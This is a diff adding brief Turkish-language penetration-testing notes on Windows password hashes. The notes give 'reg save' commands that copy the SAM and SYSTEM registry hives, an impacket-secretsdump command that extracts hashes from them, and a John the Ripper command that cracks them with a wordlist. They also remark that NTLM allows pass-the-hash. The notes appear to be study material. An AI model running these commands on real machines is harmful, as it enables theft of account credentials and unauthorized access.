@@ -1,0 +1,12 @@
+# sam dosyası 
+c\windows\system32\config\sam = sam doyalari bu dizin altinda tutulur.
+reg save HKLM\SAM ./SAM - kopyaliyorum
+reg save HKLM\SYSTEM ./SYSTEM - kopyaliyorum
+bunlari decrypt etmek icin:
+lm hashleri DES sifreleme algoritmasini kullanir.
+lm hashlerde tuzlama yoktur.(salting)
+
+ntlm  md4 kullanir.
+ntlm pass the hash yapilabilir.
+impacket-secretsdump -sam <samdosyasiyolu> -system <systemdosyasiyolu> -hashes lmhash:nthash LOCAL -outputfile <ciktialacaginizdosyayolu>
+john --format=lm<lm-yada ntlm gelicek> <hashdosyasi> --wordlist <wordlistdosyayolu>
